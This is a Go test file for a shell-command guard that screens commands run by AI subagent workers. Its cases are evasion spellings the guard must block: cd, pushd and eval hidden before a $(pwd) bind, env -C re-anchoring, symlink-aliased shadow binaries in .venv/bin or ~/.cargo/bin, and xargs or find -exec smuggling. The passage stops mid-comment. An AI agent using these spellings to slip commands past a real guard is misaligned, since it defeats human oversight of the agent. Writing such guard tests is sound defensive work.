package main

import (
	"go/ast"
	"go/parser"
	"go/token"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"testing"

	"mvdan.cc/sh/v3/syntax"
)

// ---------------------------------------------------------------------------
// R2-3: $(pwd) static bind — foreign cwd and cd-switch invalidation
// ---------------------------------------------------------------------------

// A bare $(pwd) assignment must bind the caller's SCREENED cwd so a later
// "$D/mytool" resolves to <caller-cwd>/mytool (never a planted pig in a
// foreign directory), and ANY cd/chdir/pushd/popd in the same script keeps
// $(pwd) a dynamic placeholder so the runtime value cannot be laundered.
func TestGuard_R2_PwdCwdBind(t *testing.T) {
	foreign := t.TempDir()
	// A non-/tmp trusted cwd whose .venv/bin really exists: only a
	// CORRECT $(pwd) static bind can resolve PATH="$D/.venv/bin:$PATH"
	// onto it (R6 SF-3 positive row).
	positiveCwd := filepath.Join(withTestTrustedHome(t), "proj")
	if err := os.MkdirAll(filepath.Join(positiveCwd, ".venv", "bin"), 0755); err != nil {
		t.Fatalf("mkdir positiveCwd venv: %v", err)
	}
	// A planted "pig" under the foreign dir: if $(pwd) binds the process cwd
	// instead of caller.cwd, "D=$(pwd); $D/pig" passes the guard on the wrong
	// directory and runs the planted binary. The R4 spelling uses a symlink
	// alias (mytool -> pig) so the typed name is not itself a blocked head:
	// only a CORRECT $(pwd) bind resolves to the planted target.
	writeTestExecutable(t, filepath.Join(foreign, "pig"), 0755)
	if err := os.Symlink(filepath.Join(foreign, "pig"), filepath.Join(foreign, "mytool")); err != nil {
		t.Fatalf("symlink mytool -> pig: %v", err)
	}

	cases := []struct {
		name string
		cmd  string
		cwd  string
		want string
	}{
		// Positive bind (R6 SF-3): a non-/tmp trusted cwd + a constant
		// command head keeps D=$(pwd) bound to caller.screenCwd(), so
		// PATH="$D/.venv/bin:$PATH" resolves a REAL venv pig under the
		// trusted dir and the segment passes the env-PATH audit cleanly
		// (ALLOW — not a silent false-positive: without the bind the
		// PATH= value stays dynamic and fails closed).
		{"pathA positive bind", `D=$(pwd); PATH="$D/.venv/bin:$PATH" ls`, positiveCwd, "ALLOW"},
		// Path A: guard cwd differs from process cwd — $(pwd) must still bind
		// the CALL's directory so the head resolves against it.
		// R5 MF-2: a non-constant command head anywhere in the script
		// conservatively taints PWD/OLDPWD, so the $(pwd) bind is dropped
		// and the dynamic head fails closed — the same block, earlier.
		// (The PATH row below still pins the positive foreign-cwd bind.)
		{"pathA foreign cwd pig", `D=$(pwd); "$D/mytool"`, foreign, "dynamic command head"},
		{"pathA foreign cwd PATH", `D=$(pwd); PATH="$D/.venv/bin:$PATH" pig`, foreign, "env PATH"},
		// Path B: a cd inside the script re-bases the expansion — the bind is
		// unknowable, so $(pwd) must stay dynamic and fail closed. A for-loop
		// enum head smuggling the switch (`for X in cd; do $X <evil>`) must
		// invalidate the bind the same way (R4 MF-2).
		{"pathB cd pig", `cd /tmp/evil; D=$(pwd); "$D/pig"`, "", "dynamic command head"},
		{"pathB cd PATH", `cd /tmp/evil; D=$(pwd); PATH="$D/.venv/bin:$PATH" pig`, "", "env PATH"},
		{"pathB for-enum cd", `for X in cd; do $X ` + foreign + `; done; D=$(pwd); "$D/mytool"`, "", "dynamic command head"},
		{"pathB for-enum eval", `for X in eval; do $X "cd ` + foreign + `"; done; D=$(pwd); "$D/mytool"`, "", "dynamic command head"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, tc.cwd)
			if !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q, cwd=%q) = %q, want substring %q", tc.cmd, tc.cwd, got, tc.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// R2-4: env -C / --chdir — inner head + relative PATH resolve under chdir'd cwd
// ---------------------------------------------------------------------------

// `env -C DIR` must re-anchor the inner command's resolution: a relative head
// like ./mytool joins onto DIR (not the outer cwd), and a relative PATH
// segment env itself carries (.venv/bin) resolves under DIR — in EITHER
// option order. An empty or dynamic DIR fails closed rather than falling
// back to the outer directory.
func TestGuard_R2_EnvChdirCwd(t *testing.T) {
	evil := t.TempDir()
	writeTestExecutable(t, filepath.Join(evil, "mytool"), 0755)
	venvBin := filepath.Join(evil, ".venv", "bin")
	if err := os.MkdirAll(venvBin, 0755); err != nil {
		t.Fatalf("mkdir venvBin: %v", err)
	}
	writeTestExecutable(t, filepath.Join(venvBin, "pig"), 0755)

	argvCases := []struct {
		name string
		argv []string
		want string
	}{
		{"env -C abs ./mytool", []string{"env", "-C", evil, "./mytool"}, ""},
		{"env --chdir=abs ./mytool", []string{"env", "--chdir=" + evil, "./mytool"}, ""},
		{"env -C abs PATH=.venv/bin pig", []string{"env", "-C", evil, "PATH=.venv/bin:/usr/bin", "pig"}, "env PATH"},
		{"PATH=.venv/bin env -C abs pig", []string{"env", "PATH=.venv/bin:/usr/bin", "-C", evil, "pig"}, "env PATH"},
		// A dynamic or empty chdir target fails closed: the inner relative head
		// must NOT fall back to the outer cwd.
		{"env -C empty ./mytool", []string{"env", "-C", "", "./mytool"}, "env -C"},
	}
	for _, tc := range argvCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", argv: tc.argv}, "")
			if tc.want == "" {
				if got != "ALLOW" {
					t.Fatalf("rtGuardCwd(%v) = %q, want ALLOW", tc.argv, got)
				}
			} else if !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%v) = %q, want substring %q", tc.argv, got, tc.want)
			}
		})
	}

	// Shell-text spellings through the segment peel carry the same rule.
	shellCases := []struct {
		name string
		cmd  string
		want string
	}{
		{"shell env -C ./mytool", `env -C ` + evil + ` ./mytool`, ""},
		{"shell env -C PATH pig", `env -C ` + evil + ` PATH=".venv/bin:$PATH" pig`, "env PATH"},
		{"shell PATH env -C pig", `env PATH=".venv/bin:$PATH" -C ` + evil + ` pig`, "env PATH"},
		// $(pwd) is a dynamic placeholder operand — env -C must fail closed.
		{"shell env -C $(pwd) ./mytool", `env -C "$(pwd)" ./mytool`, "env"},
	}
	for _, tc := range shellCases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if tc.want == "" {
				if got != "ALLOW" {
					t.Fatalf("rtGuardCwd(%q) = %q, want ALLOW", tc.cmd, got)
				}
			} else if !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want substring %q", tc.cmd, got, tc.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// R2-5: dot-prefixed relative head — `.foo` is a path, not a PATH lookup
// ---------------------------------------------------------------------------

// A head like `.foo` names a file in the caller's cwd (looksLikePath), never a
// PATH entry — a planted `<cwd>/.foo -> /tmp/hc` must hit the same untrusted
// path verdict as `/tmp/hc`, not silently exec the symlink target.
func TestGuard_R2_DotHeadIsPath(t *testing.T) {
	cwd := t.TempDir()
	// `.foo` is a dot-prefixed path spelling (looksLikePath) whose symlink
	// target is a planted hc — the path-form head must fail the trusted
	// canonical-slot admission, exactly like `/tmp/hc`.
	decoyTarget := filepath.Join(cwd, "hc")
	writeTestExecutable(t, decoyTarget, 0755)
	if err := os.Symlink(decoyTarget, filepath.Join(cwd, ".foo")); err != nil {
		t.Fatalf("symlink .foo -> hc: %v", err)
	}
	got := rtGuardCwd(t, rtCase{id: "dothead", role: "worker", argv: []string{".foo", "send", "t42", "ok"}}, cwd)
	if !strings.Contains(got, "untrusted path binary") {
		t.Fatalf(".foo -> hc head = %q, want untrusted path binary", got)
	}
}

// ---------------------------------------------------------------------------
// R2-6: toolchain hc/herdr-core shadow heads — block .venv/bin, keep .local/bin
// ---------------------------------------------------------------------------

// A planted hc/herdr-core in a user-writable toolchain dir shadows the real
// report-channel binary: .venv/bin/hc, node_modules/.bin/hc and
// ~/.cargo/bin/hc all fail closed, while the legitimate
// <trustedHome>/.local/bin/hc symlink to herdr-core stays free.
func TestGuard_R2_ToolchainHcShadow(t *testing.T) {
	fakeHome := withTestTrustedHome(t)
	// The workspace and stub must live under fakeHome: a /tmp workspace or
	// /tmp stub trips the /tmp-scratch block before the planted-shadow rule
	// the test exists to pin (R4).
	cwd := filepath.Join(fakeHome, "proj")
	if err := os.MkdirAll(cwd, 0755); err != nil {
		t.Fatalf("mkdir cwd: %v", err)
	}
	venvBin := filepath.Join(cwd, ".venv", "bin")
	nmBin := filepath.Join(cwd, "node_modules", ".bin")
	cargoBin := filepath.Join(fakeHome, ".cargo", "bin")
	localBin := filepath.Join(fakeHome, ".local", "bin")
	for _, d := range []string{venvBin, nmBin, cargoBin, localBin} {
		if err := os.MkdirAll(d, 0755); err != nil {
			t.Fatalf("mkdir %s: %v", d, err)
		}
	}
	stubDir := filepath.Join(fakeHome, "stubdir")
	if err := os.MkdirAll(stubDir, 0755); err != nil {
		t.Fatalf("mkdir stubDir: %v", err)
	}
	stub := filepath.Join(stubDir, "herdr-core-stub")
	writeTestExecutable(t, stub, 0755)
	for _, dir := range []string{venvBin, nmBin, cargoBin} {
		for _, name := range []string{"hc", "herdr-core"} {
			p := filepath.Join(dir, name)
			if err := os.Symlink(stub, p); err != nil {
				t.Fatalf("symlink %s -> %s: %v", p, stub, err)
			}
		}
	}
	// A symlink alias whose TARGET basename is the forbidden head must hit
	// the same planted-shadow verdict as the literal name (R4 MF-4 / R5
	// SF-6): <cargoBin>/myhc -> <cargoBin>/hc and myenv -> <cargoBin>/env
	// both smuggle the shadow past a typed-name-only check. The targets
	// are REAL files inside the toolchain dir (the planted-shadow rule
	// judges the resolved target's own directory) — the generic hc
	// symlink the loop above planted under cargoBin is removed first.
	if err := os.Remove(filepath.Join(cargoBin, "hc")); err != nil {
		t.Fatalf("remove symlink cargoBin/hc: %v", err)
	}
	for _, name := range []string{"hc", "env"} {
		writeTestExecutable(t, filepath.Join(cargoBin, name), 0755)
	}
	if err := os.Symlink(filepath.Join(cargoBin, "hc"), filepath.Join(cargoBin, "myhc")); err != nil {
		t.Fatalf("symlink myhc -> hc: %v", err)
	}
	if err := os.Symlink(filepath.Join(cargoBin, "env"), filepath.Join(cargoBin, "myenv")); err != nil {
		t.Fatalf("symlink myenv -> env: %v", err)
	}
	// The legitimate install slot <trustedHome>/.local/bin/hc resolves to a
	// real herdr-core inside the SAME trusted dir — the canonical admission
	// accepts it exactly like the production /root/.local/bin layout.
	realHc := filepath.Join(localBin, "herdr-core")
	writeTestExecutable(t, realHc, 0755)
	if err := os.Symlink(realHc, filepath.Join(localBin, "hc")); err != nil {
		t.Fatalf("symlink .local/bin/hc -> herdr-core: %v", err)
	}

	// Block: relative PATH segments that resolve inside the project tree.
	for _, seg := range []string{".venv/bin", "node_modules/.bin"} {
		pathEnv := seg + ":" + os.Getenv("PATH")
		t.Setenv("PATH", pathEnv)
		got := rtGuardCwd(t, rtCase{id: "relpath-" + seg, role: "worker", argv: []string{"hc", "send", "t42", "ok"}}, cwd)
		if !strings.Contains(got, "shadow binary") && !strings.Contains(got, "untrusted path binary") {
			t.Fatalf("relative PATH %q hc head = %q, want shadow/untrusted binary block", seg, got)
		}
	}
	// Block: absolute user toolchain dir (~/.cargo/bin).
	t.Setenv("PATH", cargoBin+":"+os.Getenv("PATH"))
	if got := rtGuardCwd(t, rtCase{id: "cargobin-hc", role: "worker", argv: []string{"hc", "send", "t42", "ok"}}, cwd); !strings.Contains(got, "shadow binary") && !strings.Contains(got, "untrusted path binary") {
		t.Fatalf("~/.cargo/bin hc head = %q, want shadow/untrusted binary block", got)
	}
	// Allow: the real <trustedHome>/.local/bin/hc install slot.
	t.Setenv("PATH", localBin+":"+os.Getenv("PATH"))
	if got := rtGuardCwd(t, rtCase{id: "localbin-hc", role: "worker", argv: []string{"hc", "send", "t42", "ok"}}, cwd); got != "ALLOW" {
		t.Fatalf("trusted .local/bin hc head = %q, want ALLOW", got)
	}
	// Block: the symlink-alias smuggle — myhc -> <cargoBin>/hc under the
	// cargo toolchain dir is a planted shadow whose resolved target lives
	// INSIDE the user toolchain dir (R5 SF-6 exact assertion).
	t.Setenv("PATH", cargoBin+":"+os.Getenv("PATH"))
	if got := rtGuardCwd(t, rtCase{id: "cargobin-myhc", role: "worker", argv: []string{"myhc", "send", "t42", "ok"}}, cwd); !strings.Contains(got, "planted shadow binary") {
		t.Fatalf("~/.cargo/bin myhc -> hc head = %q, want planted shadow binary block", got)
	}
	// Block: myenv -> <cargoBin>/env — the resolved env target lives in
	// the same user toolchain dir, so even a no-op operand run is a
	// planted shadow (R5 SF-6: the resolved-target rule fires before the
	// env re-peel can launder the name).
	if got := rtGuardCwd(t, rtCase{id: "cargobin-myenv", role: "worker", argv: []string{"myenv", "echo", "ok"}}, cwd); !strings.Contains(got, "planted shadow binary") {
		t.Fatalf("~/.cargo/bin myenv -> env head = %q, want planted shadow binary block", got)
	}
	// Block: an xargs target re-anchored by env -C into a foreign dir must
	// not smuggle a planted ctxmode — the peeled env ops seed the target's
	// own resolution caller (R4 MF-2). The file is named myctxmode (a
	// symlink to the screened binary's own basename) so the hit lands on
	// the resolved-target rule, never the typed name.
	evil := filepath.Join(fakeHome, "evil")
	if err := os.MkdirAll(evil, 0755); err != nil {
		t.Fatalf("mkdir evil: %v", err)
	}
	selfExe, err := os.Executable()
	if err != nil {
		t.Fatalf("os.Executable: %v", err)
	}
	if err := os.Symlink(selfExe, filepath.Join(evil, "myctxmode")); err != nil {
		t.Fatalf("symlink myctxmode -> selfExe: %v", err)
	}
	if got := rtGuardCwd(t, rtCase{
		id: "xargs-env-C-myctxmode", role: "worker",
		cmd: `printf '--hc-gate\nsend\nt42\nhi\n' | xargs env -C ` + evil + ` ./myctxmode`,
	}, cwd); !strings.Contains(got, "xargs ctxmode --hc-gate") {
		t.Fatalf("xargs env -C <evil> ./myctxmode = %q, want xargs ctxmode --hc-gate block", got)
	}
	// The find -exec twin: {} feeds a path operand, the env -C re-anchor
	// still moves the target's resolution into <evil>.
	if got := rtGuardCwd(t, rtCase{
		id: "find-exec-env-C-myctxmode", role: "worker",
		cmd: `find . -exec env -C ` + evil + ` ./myctxmode {} \;`,
	}, cwd); !strings.Contains(got, "find -exec ctxmode --hc-gate") {
		t.Fatalf("find -exec env -C <evil> ./myctxmode = %q, want find -exec ctxmode --hc-gate block", got)
	}
	// R2 SF-1: `env -C <dir> hc send t42 "$x"` never rewrites — a cwd-
	// changing wrapper surrenders provenance exactly like an env -i.
	g := guardCall{subagent: true}
	prep := g.prepareCtxRunArgv([]string{"env", "-C", cwd, "hc", "send", "t42", "$x"}, "")
	if prep.rule == "" && strings.Contains(strings.Join(prep.execArgv, " "), "--hc-gate") {
		t.Fatalf("env -C hc send rewritten to --hc-gate: %v", prep.execArgv)
	}
}

// ---------------------------------------------------------------------------
// R2-7: bash -c re-review under the bash dialect
// ---------------------------------------------------------------------------

// A `bash -c` payload may carry bash-only syntax ($'...', [[ ... ]], (( )))
// that a POSIX re-review would reject — the second pass must use
// guardShellSubagentDepthBash so a legal rewrite is not killed and a nested
// `hc send` inside the bash script still reaches the gate.
func TestGuard_R2_BashDialectReReview(t *testing.T) {
	g := guardCall{subagent: true}
	// A benign bash-only script must pass both prepare and re-review.
	prep := g.prepareCtxRunArgv([]string{"bash", "-c", `x=$'a\nb'; [[ $x == *b* ]] && echo ok`}, "")
	if prep.rule != "" {
		t.Fatalf("bash-only script re-review = %q: %q, want pass", prep.rule, prep.detail)
	}
	// A dynamic hc send hidden inside bash syntax must still rewrite and
	// screen under the bash dialect (the rewritten --hc-gate argv then faces
	// the same prepare→guard round the POSIX path uses).
	prep = g.prepareCtxRunArgv([]string{"bash", "-c", `hc send t42 "$x"`}, "")
	if prep.rule != "" {
		t.Fatalf("bash -c dynamic hc send = %q: %q, want prepared", prep.rule, prep.detail)
	}
	// R3 SF-3: the rewritten execArgv must carry the --hc-gate leaf the
	// provenance admits (never a raw hc head left for the runtime).
	joined := strings.Join(prep.execArgv, " ")
	if !strings.Contains(joined, "--hc-gate") {
		t.Fatalf("bash -c rewrite missing --hc-gate: %v", prep.execArgv)
	}
	// The combined bash-only + dynamic-send spelling stays rewritable too:
	// $'...' and [[ ... ]] are legal under the bash dialect while "$x"
	// still lands in the --hc-gate text slot.
	prep = g.prepareCtxRunArgv([]string{"bash", "-c", `x=$'a\nb'; [[ $x == *b* ]] && hc send t42 "$x"`}, "")
	if prep.rule != "" {
		t.Fatalf("bash -c combined dynamic hc send = %q: %q, want prepared", prep.rule, prep.detail)
	}
	if !strings.Contains(strings.Join(prep.execArgv, " "), "--hc-gate") {
		t.Fatalf("combined rewrite missing --hc-gate: %v", prep.execArgv)
	}
}

// ---------------------------------------------------------------------------
// R3-MF-2a: env -C <evil> ./mysh -c pig — inner shell head resolves under the
// chdir'd directory, so a planted mysh -> /bin/sh in <evil> can never pose as
// the peeled -c interpreter (alias-promoted wrappers keep the -c payload
// screened; a planted pig argv head still blocks).
// ---------------------------------------------------------------------------

func TestGuard_R3_EnvChdirInnerShellAlias(t *testing.T) {
	evil := t.TempDir()
	// mysh -> /bin/sh inside the foreign dir: `env -C <evil> ./mysh -c pig`
	// must NOT let the chdir'd shell head smuggle the pig payload past the
	// inner -c screen.
	if err := os.Symlink("/bin/sh", filepath.Join(evil, "mysh")); err != nil {
		t.Fatalf("symlink mysh -> /bin/sh: %v", err)
	}
	got := rtGuardCwd(t, rtCase{id: "env-C-mysh-c", role: "worker", argv: []string{"env", "-C", evil, "./mysh", "-c", "pig"}}, "")
	if !strings.Contains(got, "pig") {
		t.Fatalf("env -C <evil> ./mysh -c pig = %q, want pig block", got)
	}
}

// ---------------------------------------------------------------------------
// R3-MF-2b: relative `env -C sub` must not double-join onto itself (sub/sub)
// — the inner ./mytool resolves under <cwd>/sub exactly once.
// ---------------------------------------------------------------------------

func TestGuard_R3_EnvChdirRelativeNoDoubleJoin(t *testing.T) {
	cwd := t.TempDir()
	sub := filepath.Join(cwd, "sub")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatalf("mkdir sub: %v", err)
	}
	writeTestExecutable(t, filepath.Join(sub, "mytool"), 0755)
	// A benign tool under the chdir'd sub: `env -C sub ./mytool` must pass
	// (the cwd re-anchors to <cwd>/sub, NOT <cwd>/sub/sub).
	got := rtGuardCwd(t, rtCase{id: "env-C-sub-mytool", role: "worker", argv: []string{"env", "-C", "sub", "./mytool"}}, cwd)
	if got != "ALLOW" {
		t.Fatalf("env -C sub ./mytool = %q, want ALLOW", got)
	}
	// A planted pig under the same sub still blocks through the relative -C.
	writeTestExecutable(t, filepath.Join(sub, "pig"), 0755)
	got = rtGuardCwd(t, rtCase{id: "env-C-sub-pig", role: "worker", argv: []string{"env", "-C", "sub", "./pig"}}, cwd)
	if !strings.Contains(got, "pig") {
		t.Fatalf("env -C sub ./pig = %q, want pig block", got)
	}
}

// ---------------------------------------------------------------------------
// R3-MF-2c: env -C <evil> ./mysh + stdin "pig" — the stdin payload screen
// sees the chdir'd shell head, so the streamed program still blocks.
// ---------------------------------------------------------------------------

func TestGuard_R3_EnvChdirStdinTarget(t *testing.T) {
	fakeHome := withTestTrustedHome(t)
	// The workspace, sub dir and stub stay under fakeHome — a /tmp
	// workspace or /tmp symlink target trips the /tmp block before the
	// env -C re-anchor the test pins (R4).
	cwd := filepath.Join(fakeHome, "proj")
	sub := filepath.Join(cwd, "sub")
	if err := os.MkdirAll(sub, 0755); err != nil {
		t.Fatalf("mkdir sub: %v", err)
	}
	if err := os.Symlink("/bin/sh", filepath.Join(sub, "mysh")); err != nil {
		t.Fatalf("symlink mysh -> /bin/sh: %v", err)
	}
	// A relative `env -C sub` re-anchors the inner ./mysh onto <cwd>/sub
	// exactly once (no doubled join); the streamed pig program still
	// blocks (R4 MF-1, R2 SF-1).
	got := rtGuardCwd(t, rtCase{
		id: "env-C-sub-mysh-stdin", role: "worker",
		argv:  []string{"env", "-C", "sub", "./mysh"},
		stdin: "pig",
	}, cwd)
	if !strings.Contains(got, "pig") {
		t.Fatalf("env -C sub ./mysh stdin=pig = %q, want pig block", got)
	}
}

// ---------------------------------------------------------------------------
// R3-MF-3: builtin/command-prefixed pushd and eval-cd invalidate $(pwd)
// static binds — D=$(pwd) can never bind a static cwd after a hidden
// directory switch.
// ---------------------------------------------------------------------------

func TestGuard_R3_PwdBindHiddenSwitch(t *testing.T) {
	evil := t.TempDir()
	writeTestExecutable(t, filepath.Join(evil, "pig"), 0755)
	cases := []struct {
		name string
		cmd  string
		want string
	}{
		{"builtin pushd", `builtin pushd ` + evil + `; D=$(pwd); "$D/pig"`, "dynamic command head"},
		{"command pushd", `command pushd ` + evil + `; D=$(pwd); "$D/pig"`, "dynamic command head"},
		{"eval cd", `eval "cd ` + evil + `"; D=$(pwd); "$D/pig"`, "dynamic command head"},
		{"source dot", `. /dev/null; cd ` + evil + `; D=$(pwd); "$D/pig"`, "dynamic command head"},
		{"popd", `pushd /tmp >/dev/null; popd >/dev/null; D=$(pwd); "$D/pig"`, "dynamic command head"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", cmd: tc.cmd}, "")
			if !strings.Contains(got, tc.want) {
				t.Fatalf("rtGuardCwd(%q) = %q, want substring %q", tc.cmd, got, tc.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// R3-SF-2: PATH-planted shadow hc never earns a --hc-gate rewrite — the
// dynamic hc send under a .venv/bin / ~/.cargo/bin PATH stays blocked.
// ---------------------------------------------------------------------------

func TestGuard_R3_ShadowHcNoRewrite(t *testing.T) {
	fakeHome := withTestTrustedHome(t)
	// cwd and stub under fakeHome (never /tmp): the planted-shadow verdict
	// must be reached, not the generic /tmp-scratch block (R4).
	cwd := filepath.Join(fakeHome, "proj")
	if err := os.MkdirAll(cwd, 0755); err != nil {
		t.Fatalf("mkdir cwd: %v", err)
	}
	venvBin := filepath.Join(cwd, ".venv", "bin")
	cargoBin := filepath.Join(fakeHome, ".cargo", "bin")
	for _, d := range []string{venvBin, cargoBin} {
		if err := os.MkdirAll(d, 0755); err != nil {
			t.Fatalf("mkdir %s: %v", d, err)
		}
	}
	stubDir := filepath.Join(fakeHome, "stubdir")
	if err := os.MkdirAll(stubDir, 0755); err != nil {
		t.Fatalf("mkdir stubDir: %v", err)
	}
	stub := filepath.Join(stubDir, "herdr-core-stub")
	writeTestExecutable(t, stub, 0755)
	for _, dir := range []string{venvBin, cargoBin} {
		if err := os.Symlink(stub, filepath.Join(dir, "hc")); err != nil {
			t.Fatalf("symlink %s/hc: %v", dir, err)
		}
	}
	for _, tc := range []struct {
		name string
		path string
	}{
		{"venv shadow", venvBin + ":" + os.Getenv("PATH")},
		{"cargo shadow", cargoBin + ":" + os.Getenv("PATH")},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Setenv("PATH", tc.path)
			g := guardCall{subagent: true}
			prep := g.prepareCtxRunArgv([]string{"hc", "send", "t42", "$x"}, "")
			// The shadow hc must NOT be rewritten into --hc-gate; either the
			// prepare blocks or the argv keeps the bare hc head for the guard.
			if prep.rule == "" && strings.Contains(strings.Join(prep.execArgv, " "), "--hc-gate") {
				t.Fatalf("shadow hc rewritten to --hc-gate: %v", prep.execArgv)
			}
			got := rtGuardCwd(t, rtCase{id: tc.name, role: "worker", argv: []string{"hc", "send", "t42", "ok"}}, cwd)
			// A relative-PATH shadow blocks either at the path-trust screen
			// (shadow/untrusted binary) or at the structural-alias screen
			// (the symlink target is itself a blocked agent head); the
			// planted cargo-bin absolute dir hits the first verdict.
			blocked := strings.Contains(got, "shadow binary") ||
				strings.Contains(got, "untrusted path binary") ||
				strings.Contains(got, "conflicting structural alias")
			if !blocked {
				t.Fatalf("%s hc head = %q, want a guard block", tc.name, got)
			}
		})
	}
	// R4 MF-3 / R5 MF-1: a PATH= assign prefix inside the -c script must
	// drive the leaf rewrite's effective PATH — `PATH=<cargoBin>:$PATH sh
	// -c 'hc send t42 "$x"'` peels the prefix, feeds it to
	// collectLeafHcEdit, and can no longer launder the shadow hc into
	// --hc-gate. prepareCtxRunShell is the entry that actually reaches
	// the leaf rewriter (the argv spelling never unwraps into it).
	t.Run("PATH prefix sh -c", func(t *testing.T) {
		g := guardCall{subagent: true}
		prep := g.prepareCtxRunShell(`PATH=` + cargoBin + `:$PATH sh -c 'hc send t42 "$x"'`)
		if prep.rule == "" && strings.Contains(prep.execCode, "--hc-gate") {
			t.Fatalf("PATH-prefix shadow hc rewritten to --hc-gate: %q", prep.execCode)
		}
		// R6 SF-2: STATIC send spelling — the planted-shadow verdict is
		// asserted exactly (a dynamic "$x" slot could have blocked on the
		// generic payload rule before ever reaching the shadow check).
		got := rtGuardCwd(t, rtCase{
			id: "path-prefix-hc", role: "worker",
			cmd: `PATH=` + cargoBin + `:$PATH sh -c 'hc send t42 ok'`,
		}, cwd)
		if !strings.Contains(got, "planted shadow binary") {
			t.Fatalf("PATH=<cargoBin> sh -c hc send = %q, want planted shadow binary", got)
		}
	})

	// R5 closeout probes (each pins one of the six R5 fix sites):
	//
	// 1. peelWrappersWithIndex replays PATH= ops over
	//    caller.effectivePATH(): an outer caller.pathEnv carrying a
	//    `nice -> exec` alias makes the SAFE-LOOKING typed `nice` head
	//    resolve to an UNSAFE peel base — headIdx must surrender
	//    (return -1). Before the fix the replay used os.Getenv("PATH")
	//    and the alias was invisible to the slot walk.
	t.Run("R5 MF-1 nice->exec headIdx", func(t *testing.T) {
		aliasDir := filepath.Join(fakeHome, "aliasbin")
		if err := os.MkdirAll(aliasDir, 0755); err != nil {
			t.Fatalf("mkdir aliasDir: %v", err)
		}
		// The symlink TARGET must exist or EvalSymlinks leaves the typed
		// name unresolved (rb stays "", no unsafe-base hit).
		writeTestExecutable(t, filepath.Join(aliasDir, "exec"), 0755)
		if err := os.Symlink(filepath.Join(aliasDir, "exec"), filepath.Join(aliasDir, "nice")); err != nil {
			t.Fatalf("symlink nice -> exec: %v", err)
		}
		caller := callerIdentity{pathEnv: aliasDir}
		_, headIdx, _, _, _ := peelWrappersWithIndex([]string{"nice", "-n", "5", "hc", "send", "t42", "$x"}, caller)
		if headIdx != -1 {
			t.Fatalf("nice -> exec alias: headIdx = %d, want -1 (provenance surrendered)", headIdx)
		}
	})
	//
	// 2. preScanVarMutations / emitCall: a prefix env assign ahead of a
	//    for-loop enum head expansion no longer hides the directory
	//    switch — `for X in eval; do FOO=1 $X "cd <evil>"; done` must
	//    still invalidate the $(pwd) static bind (R5 MF-2).
	t.Run("R5 MF-2 for-enum eval FOO=1", func(t *testing.T) {
		evil := t.TempDir()
		writeTestExecutable(t, filepath.Join(evil, "pig"), 0755)
		if err := os.Symlink(filepath.Join(evil, "pig"), filepath.Join(evil, "mytool")); err != nil {
			t.Fatalf("symlink mytool -> pig: %v", err)
		}
		got := rtGuardCwd(t, rtCase{
			id: "for-enum-eval-FOO", role: "worker",
			cmd: `for X in eval; do FOO=1 $X "cd ` + evil + `"; done; D=$(pwd); "$D/mytool"`,
		}, "")
		if !strings.Contains(got, "dynamic command head") {
			t.Fatalf("for-enum FOO=1 eval cd = %q, want dynamic command head", got)
		}
	})
	//
	// 3. stdinProgramTargetsWithEnv seeds `ea` before the canon
	//    early-return: `env -C sub genv ./mysh` peels -C, sees `genv`
	//    canonicalise to `env`, recurses with the seeded caller — the
	//    inner ./mysh must resolve under <cwd>/sub (R5 MF-4a).
	t.Run("R5 MF-4 env -C genv stdin", func(t *testing.T) {
		sub := filepath.Join(cwd, "sub")
		if err := os.MkdirAll(sub, 0755); err != nil {
			t.Fatalf("mkdir sub: %v", err)
		}
		if err := os.Symlink("/bin/sh", filepath.Join(sub, "mysh")); err != nil {
			t.Fatalf("symlink mysh -> /bin/sh: %v", err)
		}
		got := rtGuardCwd(t, rtCase{
			id: "env-C-sub-genv-mysh-stdin", role: "worker",
			argv:  []string{"env", "-C", "sub", "genv", "./mysh"},
			stdin: "pig",
		}, cwd)
		if !strings.Contains(got, "pig") {
			t.Fatalf("env -C sub genv ./mysh stdin=pig = %q, want pig block", got)
		}
	})
	//
	// 4. scriptAllowsLocalShellStdinPrepare seeds the OUTER env on the
	//    caller itself: outerEnv carrying `env -C sub` must make the
	//    inner ./mysh resolve under <cwd>/sub — the planted non-shell
	//    (mycat -> selfExe) there is a DATA consumer, not a shell, so
	//    the rewrite refuses (false). Without the -C re-anchor the same
	//    head would land on a system shell and return true (R5 MF-4b).
	t.Run("R5 MF-4 outerEnv env -C sub", func(t *testing.T) {
		sub := filepath.Join(cwd, "sub")
		if err := os.MkdirAll(sub, 0755); err != nil {
			t.Fatalf("mkdir sub: %v", err)
		}
		selfExe4, err := os.Executable()
		if err != nil {
			t.Fatalf("os.Executable: %v", err)
		}
		if err := os.Symlink(selfExe4, filepath.Join(sub, "mycat")); err != nil {
			t.Fatalf("symlink mycat -> selfExe: %v", err)
		}
		// R6 MF-1 pairing: a same-name SHELL alias lives at cwd, so the
		// IDENTICAL "./mycat" head resolves to a local shell (true) without
		// -C and to the non-shell selfExe (false) with `env -C sub` — the
		// boolean flip can no longer pass vacuously on an unresolvable head.
		if err := os.Symlink("/bin/sh", filepath.Join(cwd, "mycat")); err != nil {
			t.Fatalf("symlink cwd mycat -> /bin/sh: %v", err)
		}
		g := guardCall{subagent: true, cwd: cwd}
		caller := g.callerIdentity()
		var outerEnv envAssignments
		outerEnv.ops = append(outerEnv.ops, envOp{kind: 'd', value: "sub"})
		if _, ok := scriptAllowsLocalShellStdinPrepare("./mycat", false, outerEnv, os.Getenv("PATH"), caller); ok {
			t.Fatalf("env -C sub + ./mycat (non-shell) must refuse the stdin shell rewrite")
		}
		// Control: the same "./mycat" without the -C re-anchor resolves to
